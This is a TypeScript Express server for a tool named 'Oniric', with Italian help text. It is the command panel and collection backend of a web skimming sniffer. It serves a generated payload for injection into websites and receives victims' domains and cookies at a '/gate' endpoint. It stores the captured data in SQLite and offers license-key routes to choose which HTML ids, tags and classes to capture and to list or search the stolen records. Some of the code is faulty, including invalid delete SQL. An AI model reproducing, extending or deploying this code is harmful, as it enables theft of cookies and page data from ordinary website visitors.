import * as http from "http";
import * as express from "express"
import * as bodyParser from "body-parser";
import * as cors from "cors";
import * as fs from "fs";
import * as sqlite3 from 'sqlite3';
import * as body from 'express-validator';
import {Generator} from "./modules/generator";
import {Logger} from "./modules/logger";
import {Loader} from "./modules/loader";
const app = express();
export class App {
  public conf:any;
  private logger:Logger;
  public generator:Generator;
  public loader:Loader;
  public eccipient: any;
  public expose: any;
  public detectedIp: any;
  public salty: String;
  public contain: any;
  public db: any = new sqlite3.Database('./history.db');
    constructor() {
        this.logger = new Logger();
        this.generator = new Generator();
        this.loader = new Loader();
        this.loader.bannerMessage();
        this.detectedIp = this.loader.findIp();
        app.use(cors());
        app.use(bodyParser.urlencoded({
            extended: false
        }));
         app.use(bodyParser.json());
            fs.readFile('./config.json', "utf8", (err, jsonString) => {
              if (err) throw err;
                this.conf = JSON.parse(jsonString);
                console.log('[!] Instance User:'+this.conf.instanceUser);
                console.log('[!] License Key:'+this.conf.licenseKey);
                this.salty=""+this.conf.instanceUser;
                this.bringevil();
                this.logger.initDb();
                this.start(this.conf.port,this.detectedIp);
            });
    }
    public bringevil(): void{
      this.generator.populate(JSON.parse(fs.readFileSync('./config.json', 'utf8')),this.salty);
      this.eccipient = this.generator.init();
      this.expose = this.generator.endpoint();
    }
    private start(x:any,y:any): void {
        app.get('/'+this.salty,(req,res)=>{
          res.send(this.eccipient);
        });
        app.get('/'+this.conf.licenseKey,(req,res)=>{
          let commonids='';
          let commontags='';
          let commonclasses='';
          this.conf.documentids.forEach((id)=>{
            commonids +='\''+id+'\','
          });
          this.conf.documenttags.forEach((id)=>{
            commontags +='\''+id+'\','
          });
          this.conf.documentclasses.forEach((id)=>{
            commonclasses +='\''+id+'\','
          });
          res.send(`
<style>
body {-webkit-font-smoothing: antialiased;-moz-osx-font-smoothing: grayscale;font-family: 'Roboto Slab', serif; }
h1 {margin-top: 80px;user-select: none;text-align: center;font-weight: 300; }
p {max-width: 100%;max-height: 100%;font-weight: 300;color: #546E7A;user-select: none;text-align: center;margin: 0; }
a {text-align: center;text-decoration: none;color: #FFF; }
.menu {position: fixed;width: 100vw;pointer-events: none;margin-top: 10vh;text-align: center;z-index: 2; }
.menu__link {display: inline-block;text-decoration: none;border: 2px solid #263238;color: #263238;pointer-events: auto;line-height: 40px;position: relative;padding: 0 50px;box-sizing: border-box;margin: 0;user-select: none;overflow: hidden;border-radius: 50px;
&::before {content: attr(data-hover);background-color: #263238;color: #FFF;position: absolute;top: 100%;bottom: 0;left: 0;transition: all 300ms cubic-bezier(0.190, 1.000, 0.560, 1.000);right: 0; }
&:hover::before {top: 0; }}
.panel {display: flex;align-items: center;justify-content: center;flex-direction: column;position: absolute;top: 0;bottom: 0;left: 0;right: 0;overflow: auto;z-index: 999;color: #000;box-sizing: border-box;background-color: #ECEFF1; }
.panel__content {opacity: 0;will-change: margin-top;transition: all 700ms;transition-delay: 600ms;padding: 100px 200px;margin-top: -5%; }
.panel__content p{text-align: center;text-decoration: none;color: #FFF;}
.panel:target .panel__content {opacity: 1;margin-top: 0; }
.panel#home {z-index: 1;background: radial-gradient(ellipse at center, rgba(255,255,255,1) 0%,#CFD8DC 100%); }
.panel#fade {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
.panel#fade2 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
.panel#fade3 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
.panel#fade4 {background-color: #171A18;opacity: 0;transition: all 800ms;pointer-events: none; }
.panel#fade:target {opacity: 1;pointer-events: auto; }
.panel#fade2:target {opacity: 1;pointer-events: auto; }
.panel#fade3:target {opacity: 1;pointer-events: auto; }
.panel#fade4:target {opacity: 1;pointer-events: auto; }
</style>
            <div class="panel" id="home">
              <br>  <h1>Oniric</h1><br>
            </div>
            <div class="panel" id="fade2">
                <div class="panel__content">
                <p>Website Payload (Server-Side)</p>
                <p> `+this.expose+` </p>
                </div>
                <a href="/`+this.conf.licenseKey+`"> Close [ X ]</a>
            </div>
            <div class="panel" id="fade3">
                <div class="panel__content">
                <p>User:`+this.conf.instanceUser+`</p>
                <p>Port:`+this.conf.port+`</p>
                <p>Timer Polling:`+this.conf.polling+`</p>
                <p>Sniffer Core:`+this.detectedIp+':'+this.conf.port+'/'+this.salty+`</p>
                <p>Victims Gate:`+this.detectedIp+':'+this.conf.port+'/gate'+`</p>
                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
            </div>
            </div>
            <div class="panel" id="fade">
                <div class="panel__content">
                <p>HTML IDs</p>
                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commonids.slice(0,-1)+`</p><br>
                <p>HTML Classes</p>
                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commonclasses.slice(0,-1)+`</p><br>
                <p>HTML Tags</p>
                <p style="overflow:scroll;max-width:250px;max-height:250px">`+commontags.slice(0,-1)+`</p><br>
                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
            </div>
            </div>
            <div class="panel" id="fade4">
                <div class="panel__content">
                <a href="/`+this.conf.licenseKey+`">[ X ]</a>
                </div>
            </div>
            <div class="menu">
              <a class="menu__link" href="#fade2" data-hover="Fade">Payload</a>
              <a class="menu__link" href="#fade3" data-hover="Fade">User Status</a>
              <a class="menu__link" href="#fade" data-hover="Fade">HTML Config</a>
              <a class="menu__link" href="/`+this.conf.licenseKey+`/help" data-hover="Fade">Help</a><br>
              <a class="menu__link" href="/`+this.conf.licenseKey+`/info/list" data-hover="Fade">History Dbs</a>
              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Modify Polling</a>
              <a class="menu__link" href="/`+this.conf.licenseKey+`/restart" data-hover="Fade">Restart</a>
              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Search Info</a>
              <a class="menu__link" href="#fade4" data-hover="Fade">Modify Config</a><br>
              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Clear Dbs</a>
              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Change Port</a>
              <a class="menu__link" href="/`+this.conf.licenseKey+`//" data-hover="Fade">Change Name</a>
            </div>
            `);
        });
        app.get('/'+this.conf.licenseKey+'/help',(req,res)=>{
          res.send(`<style>
                      table {
                        font-family: arial, sans-serif;
                        border-collapse: collapse;
                        width: 100%;
                      }
                      td, th {
                        border: 1px solid #dddddd;
                        text-align: left;
                        padding: 8px;
                      }
                      tr:nth-child(even) {
                        background-color: #dddddd;
                      }
                  </style>
                  <h2>HELP Page</h2>
                  <table>
                  <tr>
                  <th>Restapi Link</th>
                  <th>Descrizione</th>
                  </tr>
                  <tr>
                  <td>/licenseKey/restart</td>
                  <td>Riavvia il server</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/tags/add/nometag</td>
                  <td>Aggiunge un nuovo tag html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/ids/add/nomeid</td>
                  <td>Aggiunge un nuovo id html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/classes/add/nomeclasse</td>
                  <td>Aggiunge una nuova classe html sniffabile</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/tags/remove/nometag</td>
                  <td>Rimuove un tag html precedentemente impostato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/ids/remove/nomeid</td>
                  <td>Rimuove un id html precedentemente impostato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/classes/remove/nomeclasse</td>
                  <td>Rimuove una classe html precedentemente impostata</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/polling/modify/num</td>
                  <td>Modifica il tempo di comunicazione in secondi dello sniffer</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/info/list</td>
                  <td>Ritorna uno storico riguardante i dati sniffati sui vari siti a cui è collegato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/search/info</td>
                  <td>Ritorna uno storico riguardante i chunks di sniff sui vari siti relativi al dominio cercato</td>
                  </tr>
                  <tr>
                  <td>/licenseKey/db/clear</td>
                  <td>Cancella lo storico relativo alle operazioni di sniff sui vari siti a cui è collegato</td>
                  </tr>
                  </table>`);
        res.end();
        });
        app.get('/'+this.conf.licenseKey+'/restart',(req,res)=>{
             this.db.close();
	           process.exit(1);
             res.end();
        });
        app.get('/'+this.conf.licenseKey+'/tags/add/:tagname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documenttags.indexOf(req.params.tagname) > -1){
            res.send(`<h2> HTML Tag Già presente </h2>`);
            res.end();
          } else {
            content.documenttags.push(req.params.tagname);
            res.send(`<h2> HTML Tag Aggiunto </h2>`);
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.bringevil();
            this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'))
            res.end();
          }
        });
        app.get('/'+this.conf.licenseKey+'/tags/remove/:tagname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documenttags.indexOf(req.params.tagname) > -1) {
           content.documenttags.splice(content.documenttags.indexOf(req.params.tagname), 1);
           fs.writeFileSync('./config.json', JSON.stringify(content));
           this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
           this.bringevil();
           res.send(`<h2> HTML Tag Rimosso </h2>`);
           res.end();
         } else {
           res.send(`<h2> HTML Tag Non presente </h2>`);
           res.end();
         }
        });
        app.get('/'+this.conf.licenseKey+'/ids/add/:idname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documentids.indexOf(req.params.idname) > -1){
            res.send(`<h2> HTML ID Già presente </h2>`);
            res.end();
          } else {
            content.documentids.push(req.params.idname);
            res.send(`<h2> HTML ID Aggiunto </h2>`);
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.bringevil();
            res.end();
          }
        });
        app.get('/'+this.conf.licenseKey+'/ids/remove/:idname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documentids.indexOf(req.params.idname) > -1) {
           content.documentids.splice(content.documentids.indexOf(req.params.idname), 1);
           fs.writeFileSync('./config.json', JSON.stringify(content));
           this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
           this.bringevil();
           res.send(`<h2> HTML Id Rimosso </h2>`);
           res.end();
         } else {
           res.send(`<h2> HTML Id Non presente </h2>`);
           res.end();
         }
        });
        app.get('/'+this.conf.licenseKey+'/classes/add/:classname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          let x = req.params.classname.replace(/{}<>/g,'')
          if (content.documentclasses.indexOf(x) > -1){
            res.send(`<h2> HTML Class Già presente </h2>`);
            res.end();
          } else {
            res.send(`<h2> HTML Tag Aggiunto </h2>`);
            content.documentclasses.push(x);
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
            this.bringevil();
            res.end();
          }
        });
        app.get('/'+this.conf.licenseKey+'/classes/remove/:classname',(req,res)=>{
          let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
          if (content.documentclasses.indexOf(req.params.classname) > -1) {
           content.documentclasses.splice(content.documentclasses.indexOf(req.params.classname), 1);
           fs.writeFileSync('./config.json', JSON.stringify(content));
           this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
           this.bringevil();
           res.send(`<h2> HTML Class Rimosso </h2>`);
           res.end();
         } else {
           res.send(`<h2> HTML Class Non presente </h2>`);
           res.end();
         }
        });
        app.get('/'+this.conf.licenseKey+'/polling/modify/:interval',(req,res)=>{
            let content = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
            content.polling = req.params.interval;
            fs.writeFileSync('./config.json', JSON.stringify(content));
            this.conf = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
            this.bringevil();
            res.send(`<h2> Timer Polling Aggiornato </h2>`);
            res.end();
        });
        app.get('/'+this.conf.licenseKey+'/info/list',(req,res)=>{
          const sql = "SELECT * FROM info";
          this.db.all(sql, [], function(err, rows) {
            if (err) {
              console.log(err);
            }
            res.json({
                       "message":"success",
                       "data":rows
                   });
            });
        });
        app.get('/'+this.conf.licenseKey+'/db/clear',(req,res)=>{
          const sql = "DELETE * FROM info ";
          this.db.all(sql, function(err) {
            if (err) {
              res.send('No result found');
            }
            res.json({
                       "message":"success",
                   });
            });
        });
        app.get('/'+this.conf.licenseKey+'/search/info/:keywordname',(req,res)=>{
          const sql = "SELECT * FROM info WHERE address=? ";
          this.db.all(sql, [req.params.keywordname], function(err, rows) {
            if (err) {
              res.send('No result found');
            }
            res.json({
                       "message":"success",
                       "data":rows
                   });
            });
        });
        app.post('/gate',(req,res)=>{
          if (req.body.domain === null && req.body.cookie === null){
            this.logger.alertMessage(req);
          } else {
            this.logger.writeLogs(req.body);
          }
            res.status(200);
            res.end();
         });
        const web = http.createServer(app);
        web.listen(x,y , () => {
          console.log('[!] Server Status ON with '+`PID: ${process.pid}`+' Given IP Addr:'+this.detectedIp+':'+this.conf.port);
        });
    }
}
export default new App();
